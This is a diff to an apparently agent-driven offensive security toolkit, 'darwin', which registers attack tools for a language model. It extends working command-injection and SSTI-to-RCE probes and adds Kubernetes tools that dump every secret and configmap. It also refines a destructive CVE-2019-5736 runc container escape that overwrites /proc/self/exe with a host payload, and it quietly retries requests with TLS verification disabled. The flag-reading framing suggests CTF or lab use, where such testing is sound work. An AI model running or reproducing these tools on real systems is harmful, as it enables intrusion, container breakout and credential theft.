@@ -12,6 +12,7 @@ import logging
 import os as _os_module
 import random
 import re
+import shutil
 import string
 import time
 from pathlib import Path
@@ -23,6 +24,7 @@ from darwin.tools.mcp_gateway import MCPGateway, ToolResult
 from darwin.tools.params import headers_to_lines, normalize_headers
 from darwin.tools.paths import resolve_wordlist, tool_path_env
 from darwin.tools.spec import EXECUTOR_SHELL, auto_spec
+from darwin.tools.tls import is_cert_verify_error, unverified_context
 
 
 def resolve_fuzz_wordlist(requested: str) -> str:
@@ -214,6 +216,31 @@ def _parse_smbmap_output(stdout: str) -> Dict[str, Any]:
     return {"shares": shares, "count": len(shares)}
 
 
+async def _k8s_api_url(path: str) -> str:
+    """Kubernetes API-server URL for a resource path, port preserved.
+
+    In-pod deployments know the endpoint from ``KUBERNETES_SERVICE_HOST``;
+    a host-side deployment only has the kubeconfig.  Both are used verbatim
+    (netloc, not a dotted-number regex), so the port is never dropped.
+    """
+    from urllib.parse import urlparse as _urlparse
+    env = await _run_shell(
+        "printf '%s:%s' \"$KUBERNETES_SERVICE_HOST\" \"$KUBERNETES_SERVICE_PORT\"",
+        timeout=5,
+    )
+    host_port = (env.stdout or "").strip().strip(":")
+    if host_port and not host_port.startswith(":"):
+        return f"https://{host_port}{path}"
+    cfg = await _run_shell(
+        "kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null",
+        timeout=10,
+    )
+    parsed = _urlparse((cfg.stdout or "").strip().strip("'"))
+    if parsed.scheme and parsed.netloc:
+        return f"{parsed.scheme}://{parsed.netloc}{path}"
+    return f"https://kubernetes.default.svc{path}"
+
+
 async def _run_shell(cmd: str, timeout: int = 60) -> ToolResult:
     """Execute a shell command with timeout.
 
@@ -296,16 +323,12 @@ async def _python_request(
     import tempfile
     import os as _os
 
-    ctx_setup = ""
-    if insecure:
-        ctx_setup = """
+    ctx_setup = """
 import ssl
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
-"""
-    else:
-        ctx_setup = "ctx = None"
+""" if insecure else "ctx = None"
 
     script = f"""
 import json, urllib.error, urllib.request
@@ -347,18 +370,36 @@ except urllib.error.HTTPError as e:
 except Exception as e:
     print(f"ERROR:{{e}}")
 """
-    # Write to temp file to avoid shell escaping issues
-    fd, tmpath = tempfile.mkstemp(suffix=".py", prefix="darwin_req_")
-    try:
-        _os.write(fd, script.encode("utf-8"))
-        _os.close(fd)
-        cmd = f"python3 {tmpath}"
-        result = await _run_shell(cmd, timeout=timeout + 5)
-    finally:
+    async def _send(payload_script: str) -> ToolResult:
+        # Write to temp file to avoid shell escaping issues
+        fd, tmpath = tempfile.mkstemp(suffix=".py", prefix="darwin_req_")
         try:
-            _os.unlink(tmpath)
-        except OSError as exc:
-            log.debug("swallowed exception: %s", exc, exc_info=True)
+            _os.write(fd, payload_script.encode("utf-8"))
+            _os.close(fd)
+            return await _run_shell(f"python3 {tmpath}", timeout=timeout + 5)
+        finally:
+            try:
+                _os.unlink(tmpath)
+            except OSError as exc:
+                log.debug("swallowed exception: %s", exc, exc_info=True)
+
+    result = await _send(script)
+    if not insecure and is_cert_verify_error(
+        f"{getattr(result, 'stdout', '')}{getattr(result, 'stderr', '')}"
+    ):
+        # The request never reached the application; retry once without
+        # verification rather than reporting an empty probe.
+        retry_script = script.replace("ctx = None", """
+import ssl
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+""", 1)
+        result = await _send(retry_script)
+        result.stdout = (
+            f"{getattr(result, 'stdout', '')}\n"
+            "# retried with TLS verification disabled (self-signed certificate)"
+        )
     return _http_envelope_result(result, method=method, url=url, tool_name=tool_name)
 
 
@@ -724,18 +765,26 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     # ── Command injection test ──────────────────────────────────
     async def command_injection_test(url: str, param: str,
+                                      method: str = "GET",
+                                      body_format: str = "form",
                                       insecure: bool = False) -> ToolResult:
-        """Test for command injection vulnerability with broad payload coverage."""
+        """Test for command injection vulnerability with broad payload coverage.
+
+        ``method``/``body_format`` matter for API-shaped targets: a JSON body
+        field the server executes (e.g. a runbook ``script``) is never reached
+        by injecting into the query string. Async targets that queue the work
+        are reported as such instead of being declared "static".
+        """
         import urllib.request
         import urllib.parse
         import ssl
         from urllib.parse import quote
 
+        _method = str(method or "GET").strip().upper() or "GET"
+        _body_format = str(body_format or "form").strip().lower() or "form"
         ctx = None
         if insecure:
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
+            ctx = unverified_context()
 
         probes: list[tuple[str, str, str]] = [
             # (payload, encode_type, label)
@@ -770,57 +819,102 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         all_responses: dict[str, str] = {}
         found_evidence = False
 
-        for probe_cmd, encode_type, label in probes:
-            if encode_type == "none":
-                # Already URL-encoded, append raw
+        def _build_request(probe_cmd: str, encode_type: str):
+            encoded = probe_cmd if encode_type == "none" else urllib.parse.quote(
+                probe_cmd, safe="")
+            if _method == "GET":
                 joiner = "&" if "?" in url else "?"
-                probe_url = f"{url}{joiner}{param}={probe_cmd}"
-            else:
-                joiner = "&" if "?" in url else "?"
-                encoded = urllib.parse.quote(probe_cmd, safe="")
-                probe_url = f"{url}{joiner}{param}={encoded}"
+                return urllib.request.Request(f"{url}{joiner}{param}={encoded}")
+            if _body_format == "json":
+                import json as _json_body
+                return urllib.request.Request(
+                    url, data=_json_body.dumps({param: probe_cmd}).encode(),
+                    headers={"Content-Type": "application/json"},
+                    method=_method,
+                )
+            return urllib.request.Request(
+                url, data=urllib.parse.urlencode({param: probe_cmd}).encode(),
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                method=_method,
+            )
 
+        def _send(probe_cmd: str, encode_type: str) -> str:
+            """Send one probe, retrying once when TLS verification blocks it."""
+            nonlocal ctx
             try:
-                req = urllib.request.Request(probe_url)
                 kwargs = {"timeout": 10}
                 if ctx is not None:
                     kwargs["context"] = ctx
-                with urllib.request.urlopen(req, **kwargs) as resp:
-                    body = resp.read().decode("utf-8", errors="replace")
-                    body_lower = body.lower()
-                    all_responses[label] = body[:300]
+                with urllib.request.urlopen(
+                    _build_request(probe_cmd, encode_type), **kwargs
+                ) as resp:
+                    return resp.read().decode("utf-8", errors="replace")
+            except Exception as exc:
+                if ctx is not None or not is_cert_verify_error(str(exc)):
+                    raise
+                ctx = unverified_context()
+                with urllib.request.urlopen(
+                    _build_request(probe_cmd, encode_type), timeout=10, context=ctx,
+                ) as resp:
+                    return resp.read().decode("utf-8", errors="replace")
 
-                    matched = []
-                    for pattern, desc in EVIDENCE_PATTERNS:
-                        if pattern.lower() in body_lower:
-                            matched.append(f"{pattern} ({desc})")
+        for probe_cmd, encode_type, label in probes:
+            try:
+                body = _send(probe_cmd, encode_type)
+                body_lower = body.lower()
+                all_responses[label] = body[:300]
 
-                    if matched:
-                        found_evidence = True
-                        results.append(
-                            f"{label}: EXECUTED — evidence: {', '.join(matched[:3])}"
-                        )
-                    elif body.strip():
-                        results.append(
-                            f"{label}: no evidence (response: {body[:120].strip()})"
-                        )
-                    else:
-                        results.append(f"{label}: no evidence (empty response)")
+                matched = [
+                    f"{pattern} ({desc})"
+                    for pattern, desc in EVIDENCE_PATTERNS
+                    if pattern.lower() in body_lower
+                ]
+                if matched:
+                    found_evidence = True
+                    results.append(
+                        f"{label}: EXECUTED — evidence: {', '.join(matched[:3])}"
+                    )
+                elif body.strip():
+                    results.append(
+                        f"{label}: no evidence (response: {body[:120].strip()})"
+                    )
+                else:
+                    results.append(f"{label}: no evidence (empty response)")
             except Exception as e:
                 results.append(f"{label}: error - {str(e)[:100]}")
 
         # If nothing executed but all got responses, include the most distinctive
         # response sample to help the LLM understand what the app returns
         if not found_evidence and all_responses:
-            # Detect static endpoints: all probes return identical response
             unique_bodies = set(all_responses.values())
-            if len(unique_bodies) == 1:
+            # An acknowledgement ("registered"/"queued"/"accepted") with no
+            # command output is the signature of ASYNCHRONOUS execution: the
+            # work was taken but runs later (worker, runbook, webhook). That is
+            # not a negative result — it needs out-of-band confirmation.
+            _ack_re = re.compile(
+                r"\b(accepted|registered|queued|enqueued|scheduled|submitted|"
+                r"pending|created|received|ok)\b",
+                re.I,
+            )
+            _ack_sample = next(
+                (body for body in all_responses.values() if _ack_re.search(body)), ""
+            )
+            if _ack_sample:
+                results.append(
+                    "ASYNC-EXECUTION SUSPECTED: the endpoint acknowledged the "
+                    f"payload without returning command output ({_ack_sample[:120].strip()}). "
+                    "The command may be executing server-side outside the request "
+                    "(worker/runbook/webhook). Confirm out-of-band: start "
+                    "`oob_listener`, send a payload that calls one of its "
+                    "callback_urls, then `oob_listener` action=read."
+                )
+            elif len(unique_bodies) == 1:
                 static_body = list(unique_bodies)[0]
                 results.append(
                     f"STATIC ENDPOINT: All {len(probes)} probes returned the SAME response "
-                    f"({static_body[:120]}). This endpoint does NOT execute the input — "
-                    f"it returns static content regardless of the parameter value. "
-                    f"Do NOT waste time on manual command injection follow-up."
+                    f"({static_body[:120]}). No in-band evidence that this parameter is "
+                    f"executed. If the endpoint queues work, confirm with `oob_listener` "
+                    f"before abandoning the hypothesis."
                 )
             else:
                 # Varied responses — show samples so LLM can analyze
@@ -844,10 +938,18 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register(
         name="command_injection_test",
         func=command_injection_test,
-        description="Test for command injection using multiple probe techniques",
+        description=(
+            "Test for command injection using multiple probe techniques. Set "
+            "method=POST and body_format=json for API endpoints that execute a "
+            "documented body field (script/command/code). If the endpoint "
+            "acknowledges the payload without output, execution may be "
+            "asynchronous — confirm with `oob_listener`."
+        ),
         parameters={
             "url": {"type": "string", "description": "Target URL"},
             "param": {"type": "string", "description": "Parameter to test"},
+            "method": {"type": "string", "description": "HTTP method (default GET; use POST for JSON APIs)", "default": "GET"},
+            "body_format": {"type": "string", "description": "POST body format: form or json (default form)", "default": "form"},
             "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
         },
     )
@@ -1180,10 +1282,14 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     async def ssti_inject(
         target_url: str, param_name: str = "name",
         method: str = "GET", template_engine: str = "jinja2",
+        body_format: str = "form",
     ) -> ToolResult:
         """Test for Server-Side Template Injection (SSTI) and attempt exploitation.
 
         Sends math evaluation payloads to detect SSTI, then attempts RCE.
+        ``body_format=json`` covers APIs whose injectable field lives in a JSON
+        body — without it this tool could only speak form-encoded POSTs, which
+        the executor reported as a framework-side contract gap on JSON targets.
         """
         import asyncio, time, urllib.parse, urllib.request, json as _json, ssl
 
@@ -1191,6 +1297,21 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
+        _use_json = str(body_format or "").strip().lower() == "json"
+
+        def _build_request(payload: str):
+            if method.upper() == "POST":
+                if _use_json:
+                    return urllib.request.Request(
+                        target_url, data=_json.dumps({param_name: payload}).encode(),
+                        headers={"Content-Type": "application/json"},
+                    )
+                return urllib.request.Request(
+                    target_url, data=urllib.parse.urlencode({param_name: payload}).encode(),
+                    headers={"Content-Type": "application/x-www-form-urlencoded"},
+                )
+            encoded = urllib.parse.quote(payload)
+            return urllib.request.Request(f"{target_url}?{param_name}={encoded}")
 
         # SSTI detection payloads by engine
         detect_payloads = {
@@ -1241,14 +1362,8 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         for engine in engines_to_test[:4]:
             payload = detect_payloads.get(engine, "{{7*7}}")
             try:
-                if method.upper() == "POST":
-                    data = urllib.parse.urlencode({param_name: payload}).encode()
-                    req = urllib.request.Request(target_url, data=data)
-                else:
-                    encoded = urllib.parse.quote(payload)
-                    req = urllib.request.Request(f"{target_url}?{param_name}={encoded}")
-
-                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+                resp = urllib.request.urlopen(
+                    _build_request(payload), timeout=10, context=ctx)
                 body = resp.read().decode("utf-8", errors="replace")
 
                 if "49" in body and "7*7" not in body:
@@ -1266,14 +1381,8 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         if detected and detected in rce_payloads:
             for rce_payload in rce_payloads[detected][:4]:
                 try:
-                    if method.upper() == "POST":
-                        data = urllib.parse.urlencode({param_name: rce_payload}).encode()
-                        req = urllib.request.Request(target_url, data=data)
-                    else:
-                        encoded = urllib.parse.quote(rce_payload)
-                        req = urllib.request.Request(f"{target_url}?{param_name}={encoded}")
-
-                    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+                    resp = urllib.request.urlopen(
+                        _build_request(rce_payload), timeout=10, context=ctx)
                     body = resp.read().decode("utf-8", errors="replace")
 
                     import re
@@ -1298,12 +1407,13 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register(
         name="ssti_inject",
         func=ssti_inject,
-        description="Test for Server-Side Template Injection (SSTI). Sends math evaluation payloads ({{7*7}}, ${7*7}, <%= 7*7 %>) to detect Jinja2/Twig/FreeMarker/ERB template injection. If SSTI is confirmed, attempts RCE via OS command execution to read flag files. Supports GET and POST methods.",
+        description="Test for Server-Side Template Injection (SSTI). Sends math evaluation payloads ({{7*7}}, ${7*7}, <%= 7*7 %>) to detect Jinja2/Twig/FreeMarker/ERB template injection. If SSTI is confirmed, attempts RCE via OS command execution to read flag files. Supports GET and POST (form or JSON body via body_format).",
         parameters={
             "target_url": {"type": "string", "description": "Target URL or endpoint (e.g. 'http://target:10112/submit')"},
             "param_name": {"type": "string", "description": "Parameter name that is injected into the template (default 'name')"},
             "method": {"type": "string", "description": "HTTP method: GET (query string) or POST (form body). Default GET."},
             "template_engine": {"type": "string", "description": "Template engine to target: jinja2, twig, freemarker, erb, or 'all' to auto-detect. Default jinja2."},
+            "body_format": {"type": "string", "description": "POST body format: form (default) or json", "default": "form"},
         },
     )
 
@@ -3926,13 +4036,58 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     # ── Kubernetes Tools ───────────────────────────────────────────
 
-    gateway.register_shell_tool(
+    async def kubectl_auth_check(sa: str = "", namespace: str = "") -> ToolResult:
+        """List Kubernetes RBAC permissions for the current identity or an SA.
+
+        The previous implementation always passed ``--as={sa}``, so an empty
+        SA name silently impersonated the anonymous user and every check came
+        back "forbidden" — which read as "the cluster grants us nothing" even
+        when darwin held cluster-admin through the ambient kubeconfig.
+        """
+        import asyncio
+        import time as _time
+        argv = ["kubectl", "auth", "can-i", "--list"]
+        if sa:
+            argv.append(f"--as={sa}")
+        if namespace:
+            argv.extend(["-n", namespace])
+        started = _time.perf_counter()
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                *argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
+        except Exception as exc:
+            return ToolResult(
+                tool_name="kubectl_auth_check", success=False, stdout="",
+                stderr=str(exc), exit_code=1,
+                elapsed_ms=(_time.perf_counter() - started) * 1000,
+            )
+        out = stdout.decode("utf-8", errors="replace")
+        err = stderr.decode("utf-8", errors="replace")
+        return ToolResult(
+            tool_name="kubectl_auth_check", success=proc.returncode == 0,
+            stdout=(out or err)[:4000], stderr=err if out else "",
+            exit_code=proc.returncode or 0,
+            elapsed_ms=(_time.perf_counter() - started) * 1000,
+        )
+
+    gateway.register(
         name="kubectl_auth_check",
-        command_template="kubectl auth can-i --list --as={sa} -n {namespace} 2>&1",
-        description="Check Kubernetes RBAC permissions for a service account in a namespace",
-        parameters={"sa": {"type": "string", "description": "Service account name"}, "namespace": {"type": "string", "description": "K8s namespace"}},
-        parser=_parse_shell_output,
-        timeout=30,
+        func=kubectl_auth_check,
+        description=(
+            "List Kubernetes RBAC permissions via 'kubectl auth can-i --list'. "
+            "Leave sa AND namespace empty to inspect the identity darwin is "
+            "actually using (the ambient kubeconfig); pass sa to impersonate a "
+            "ServiceAccount. Use this to decide whether cluster-admin paths "
+            "(pod create, pod logs, secret read) are available."
+        ),
+        parameters={
+            "sa": {"type": "string", "description": "ServiceAccount name to impersonate (default: empty = current identity)", "default": ""},
+            "namespace": {"type": "string", "description": "Namespace for the impersonated SA (default: empty = cluster scope / current context)", "default": ""},
+        },
+        domain="k8s",
+        spec=None,
     )
     gateway.register_shell_tool(
         name="kubectl_get_secrets",
@@ -4145,6 +4300,65 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=60,
     )
+
+    async def kubectl_logs(
+        pod: str, namespace: str = "default", tail_lines: int = 200,
+        container: str = "",
+    ) -> ToolResult:
+        """Read a pod's logs through kubectl.
+
+        The cheapest way to recover output a workload already produced — e.g. a
+        PoC pod that ran ``cat /host-flags/flag.txt`` when it started, whose pod
+        is now Completed/Failed.  Uses the ambient kubeconfig, so it works
+        whenever darwin's kubectl reaches the API server.
+        """
+        import asyncio
+        import time as _time
+        try:
+            _tail = max(1, min(int(tail_lines), 5000))
+        except (TypeError, ValueError):
+            _tail = 200
+        argv = ["kubectl", "logs", pod, "-n", namespace, f"--tail={_tail}"]
+        if container:
+            argv.extend(["-c", container])
+        started = _time.perf_counter()
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                *argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
+        except Exception as exc:
+            return ToolResult(
+                tool_name="kubectl_logs", success=False, stdout="",
+                stderr=str(exc), exit_code=1,
+                elapsed_ms=(_time.perf_counter() - started) * 1000,
+            )
+        out = stdout.decode("utf-8", errors="replace")
+        err = stderr.decode("utf-8", errors="replace")
+        return ToolResult(
+            tool_name="kubectl_logs", success=proc.returncode == 0 and bool(out.strip()),
+            stdout=out[:6000], stderr=err[:2000], exit_code=proc.returncode or 0,
+            elapsed_ms=(_time.perf_counter() - started) * 1000,
+        )
+
+    gateway.register(
+        name="kubectl_logs",
+        func=kubectl_logs,
+        description=(
+            "Read a pod's logs (kubectl logs). Use this FIRST for any pod that "
+            "already ran a command and exited (Completed/Failed workload, PoC or "
+            "exploit pod): its stdout — including any flag it printed — is still "
+            "available here."
+        ),
+        parameters={
+            "pod": {"type": "string", "description": "Pod name"},
+            "namespace": {"type": "string", "description": "Namespace (default 'default')", "default": "default"},
+            "tail_lines": {"type": "integer", "description": "How many trailing log lines to fetch (default 200)", "default": 200},
+            "container": {"type": "string", "description": "Container name for multi-container pods (optional)", "default": ""},
+        },
+        domain="k8s",
+    )
+
     gateway.register_shell_argv_tool(
         name="kubectl_run",
         shell_args=[
@@ -4929,26 +5143,43 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "echo 'Cannot directly check runc version — checking seccomp and container env')",
             timeout=10,
         )
+        _version_text = (check.stdout or "")
+        _version_match = re.search(r"runc version (\d+)\.(\d+)\.(\d+)", _version_text)
+        if _version_match:
+            _major, _minor, _patch = (int(g) for g in _version_match.groups())
+            # CVE-2019-5736 was fixed in runc 1.0.0-rc6.
+            if (_major, _minor, _patch) > (1, 0, 0):
+                return ToolResult(
+                    tool_name="container_escape_runc", success=False, stdout="",
+                    stderr=(
+                        f"runc {_major}.{_minor}.{_patch} is not vulnerable to "
+                        "CVE-2019-5736 (fixed in 1.0.0-rc6). This tool only exists "
+                        "for that CVE; a modern runc container escape needs a "
+                        "different vector (runtime CVE, host mount, privileged "
+                        "pod, kubelet/etcd exposure) — do not retry this call."
+                    ),
+                    exit_code=1, elapsed_ms=check.elapsed_ms,
+                )
         # The actual CVE-2019-5736 exploit requires:
         # 1. The attacker has root in the container
         # 2. The host runs a process inside the container (e.g., docker exec)
         # 3. Overwriting /proc/self/exe to replace runc binary on host
         exploit_cmd = (
-            f"echo '[CVE-2019-5736] Attempting runc escape...' && "
+            "echo '[CVE-2019-5736] Attempting runc escape...' && "
             # Write a malicious payload that will execute when runc is invoked
             f"cat > /tmp/runc_payload.sh << 'PAYLOAD_EOF'\n#!/bin/sh\n{payload_cmd}\nPAYLOAD_EOF\n"
-            f"chmod +x /tmp/runc_payload.sh 2>/dev/null && "
+            "chmod +x /tmp/runc_payload.sh 2>/dev/null && "
             # Try to overwrite runc via /proc/self/exe symlink
-            f"(cp /tmp/runc_payload.sh /proc/self/exe 2>/dev/null && "
-            f"echo '[CVE-2019-5736] Wrote payload to /proc/self/exe — runc binary overwritten. "
-            f"Trigger by waiting for docker exec or similar.' || "
-            f"echo '[CVE-2019-5736] Cannot overwrite /proc/self/exe — container may not be vulnerable "
-            f"(runc version too new, seccomp blocking, or insufficient permissions)')",
+            "(cp /tmp/runc_payload.sh /proc/self/exe 2>/dev/null && "
+            "echo '[CVE-2019-5736] Wrote payload to /proc/self/exe — runc binary overwritten. "
+            "Trigger by waiting for docker exec or similar.' || "
+            "echo '[CVE-2019-5736] Cannot overwrite /proc/self/exe — container may not be vulnerable "
+            "(runc version too new, seccomp blocking, or insufficient permissions)')",
         )
-        result = await _run_shell(
-            f"{check.stdout[:500]}\n\n{exploit_cmd}",
-            timeout=30,
-        )
+        # The version banner is reported, never interpolated into a shell
+        # command: multi-line runc output used to be word-split into the
+        # command and fail with "/bin/sh: 1: [Checking: not found".
+        result = await _run_shell(exploit_cmd, timeout=30)
         # Determine actual success: check if payload was written to /proc/self/exe
         stdout_text = result.stdout or ""
         actual_success = (
@@ -4959,7 +5190,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         return ToolResult(
             tool_name="container_escape_runc",
             success=actual_success,
-            stdout=stdout_text[:3000],
+            stdout=(_version_text[:500] + "\n" + stdout_text)[:3000],
             stderr=result.stderr,
             exit_code=actual_exit,
             elapsed_ms=result.elapsed_ms,
@@ -4968,7 +5199,15 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register(
         name="container_escape_runc",
         func=container_escape_runc,
-        description="Attempt CVE-2019-5736 runc container breakout. Exploits runc < 1.0.0-rc6 by overwriting /proc/self/exe. DESTRUCTIVE — overwrites runc binary on host. Use ONLY as last resort when docker.sock, cgroup, cap_dac, and mount_disk all fail. The payload_cmd is executed on the HOST the next time someone runs 'docker exec' in this container.",
+        description=(
+            "Attempt CVE-2019-5736 runc container breakout (runc < 1.0.0-rc6, "
+            "overwrites /proc/self/exe). DESTRUCTIVE — overwrites the host runc "
+            "binary. This is ONLY for CVE-2019-5736 and fails fast on a patched "
+            "runc: it is NOT the CVE-2024-21626 WORKDIR escape and NOT "
+            "CVE-2025-31133/52881. For modern runc CVEs use the cluster path "
+            "instead (read the affected pod's logs, or with pod-create rights "
+            "deploy a privileged pod mounting the node root)."
+        ),
         parameters={
             "payload_cmd": {"type": "string", "description": "Command to execute on host when runc is triggered (default sends flag to /tmp/runc_flag_out.txt)"},
         },
@@ -5017,30 +5256,34 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     async def k8s_secret_dump(token_path: str = "auto") -> ToolResult:
         """Dump Kubernetes secrets from all namespaces.
 
-        Auto-detects K8s API server address from environment, then tries:
-        1. Anonymous access (system:anonymous)
-        2. Default ServiceAccount token
-        3. Custom token path if provided
-
-        Equivalent to CDK's k8s-secret-dump. Differs from kubectl_get_secrets:
-        this dumps ALL namespaces and tries multiple authentication methods.
+        Tries, in order: the ambient kubeconfig (the identity darwin used for
+        cluster discovery), an in-pod ServiceAccount token, then anonymous API
+        access. The previous version only knew the in-pod path, so on a KIND
+        cluster reached from the host it reported "No token at /var/run/secrets"
+        even while `kubectl` held cluster-admin. The API-server fallback also
+        dropped the port because it regex-scraped the first dotted number out
+        of the kubeconfig server URL.
         """
-        # Get API server address
-        get_addr = await _run_shell(
-            "echo '=== API Server ===' && "
-            "(echo $KUBERNETES_SERVICE_HOST 2>/dev/null; echo $KUBERNETES_PORT 2>/dev/null) | tr '\\n' ' '; "
-            "echo ''; "
-            "kubectl config view --minify -o json 2>/dev/null | grep -o '\"server\": \"[^\"]*\"' | head -1",
-            timeout=10,
-        )
-        # Build base URL
-        import re as _re
-        addr_match = _re.search(r'([\d.]+)', get_addr.stdout)
-        host = addr_match.group(1) if addr_match else "kubernetes.default"
-        base_url = f"https://{host}/api/v1/secrets"
-
         results = []
-        # Try 1: anonymous
+
+        # Try 1: ambient kubeconfig (host-side cluster access).
+        kubectl = await _run_shell(
+            "kubectl get secrets -A -o json 2>&1 | head -c 200000", timeout=60,
+        )
+        if '"kind":"SecretList"' in (kubectl.stdout or ""):
+            return ToolResult(
+                tool_name="k8s_secret_dump", success=True,
+                stdout="=== kubectl (kubeconfig) ===\n" + kubectl.stdout[:8000],
+                stderr="", exit_code=0, elapsed_ms=kubectl.elapsed_ms,
+            )
+        results.append(
+            "=== kubectl (kubeconfig) ===\n"
+            + ((kubectl.stdout or kubectl.stderr or "")[:800])
+        )
+
+        base_url = await _k8s_api_url("/api/v1/secrets")
+
+        # Try 2: anonymous
         r1 = await _run_shell(
             f"curl -sk --connect-timeout 5 -H 'Authorization: Bearer anonymous' "
             f"'{base_url}' 2>&1 | head -200",
@@ -5048,7 +5291,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         )
         results.append(f"=== Anonymous ===\n{r1.stdout[:1500]}")
         if '"kind":"SecretList"' not in r1.stdout:
-            # Try 2: default SA token
+            # Try 3: in-pod SA token
             sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
             if token_path != "auto":
                 sa_token_path = token_path
@@ -5076,20 +5319,30 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     async def k8s_configmap_dump(token_path: str = "auto") -> ToolResult:
         """Dump Kubernetes configmaps from all namespaces.
 
-        Similar to k8s_secret_dump but for ConfigMaps — often contain
-        configuration data, environment variables, and sometimes credentials
-        that weren't stored as Secrets.
+        Same authentication ladder as k8s_secret_dump: ambient kubeconfig
+        first, then in-pod SA token and anonymous API access.
         """
-        get_addr = await _run_shell(
-            "echo $KUBERNETES_SERVICE_HOST 2>/dev/null", timeout=5,
+        results = []
+
+        kubectl = await _run_shell(
+            "kubectl get configmaps -A -o json 2>&1 | head -c 200000", timeout=60,
         )
-        host = get_addr.stdout.strip() or "kubernetes.default"
-        base_url = f"https://{host}/api/v1/configmaps"
+        if '"kind":"ConfigMapList"' in (kubectl.stdout or ""):
+            return ToolResult(
+                tool_name="k8s_configmap_dump", success=True,
+                stdout="=== kubectl (kubeconfig) ===\n" + kubectl.stdout[:8000],
+                stderr="", exit_code=0, elapsed_ms=kubectl.elapsed_ms,
+            )
+        results.append(
+            "=== kubectl (kubeconfig) ===\n"
+            + ((kubectl.stdout or kubectl.stderr or "")[:800])
+        )
+
+        base_url = await _k8s_api_url("/api/v1/configmaps")
         sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
         if token_path != "auto":
             sa_token_path = token_path
 
-        results = []
         # Try anonymous
         r1 = await _run_shell(
             f"curl -sk --connect-timeout 5 '{base_url}' 2>&1 | head -200",
@@ -5212,18 +5465,28 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
 
     async def k8s_etcd_keys(
-        endpoint: str, key: str = "/", prefix: bool = True,
+        endpoint: str, key: str = "/", keys_only: bool = True,
         insecure: bool = True, cacert: str = "", cert: str = "", tls_key: str = "",
     ) -> ToolResult:
         """Enumerate etcd keys for K8s secret discovery.
 
-        Reads K8s secrets directly from etcd when the etcd endpoint is accessible.
-        Equivalent to CDK's etcd-get-k8s-token.
+        Reads etcd keys directly when the endpoint is accessible. The flag is
+        named ``keys_only`` because it maps to ``--keys-only``; it used to be
+        called ``prefix``, which made the planner pass a key path into a
+        boolean and lose the argument during normalisation.
 
         For HTTPS endpoints adds --insecure-skip-tls-verify by default.
         When etcd client certs are available, pass cacert/cert/tls_key paths.
-        Start with key='/' and prefix=true for discovery, then target specific keys.
+        Start with key='/' for discovery, then target specific keys such as
+        /registry/secrets/<namespace>/<name>.
         """
+        if not shutil.which("etcdctl"):
+            return ToolResult(
+                tool_name="k8s_etcd_keys", success=False, stdout="",
+                stderr="etcdctl is not installed on this host — use kubectl_get_secrets "
+                       "or k8s_secret_dump instead of reading etcd directly",
+                exit_code=127, elapsed_ms=0,
+            )
         _tls_opts = ""
         if "https://" in (endpoint or ""):
             if insecure:
@@ -5234,10 +5497,10 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                 _tls_opts += f" --cert={cert}"
             if tls_key:
                 _tls_opts += f" --key={tls_key}"
-        prefix_flag = "--prefix" if prefix else ""
+        keys_only_flag = "--keys-only" if keys_only else ""
         exec_cmd = (
             f"ETCDCTL_API=3 etcdctl --endpoints={endpoint}{_tls_opts} "
-            f"get {key} {prefix_flag} --keys-only 2>&1 | head -100"
+            f"get {key} --prefix {keys_only_flag} 2>&1 | head -100"
         )
         result = await _run_shell(exec_cmd, timeout=30)
         return ToolResult(tool_name="k8s_etcd_keys", success=result.exit_code == 0,
@@ -5247,11 +5510,11 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register(
         name="k8s_etcd_keys",
         func=k8s_etcd_keys,
-        description="ENUMERATE etcd keys for K8s secrets. Reads directly from etcd (port 2379) without API server. Use when etcd is accessible. For HTTPS endpoints auto-skips TLS verify. Supports mutual TLS via cacert/cert/tls_key params. Start with key='/' and prefix=true to discover all keys. More direct than k8s_secret_dump — reads raw base64-encoded secrets from etcd.",
+        description="ENUMERATE etcd keys for K8s secrets. Reads directly from etcd (port 2379) without API server. Use when etcd is accessible. For HTTPS endpoints auto-skips TLS verify. Supports mutual TLS via cacert/cert/tls_key params. Start with key='/' to discover all keys, then read a specific key like /registry/secrets/default/mysecret.",
         parameters={
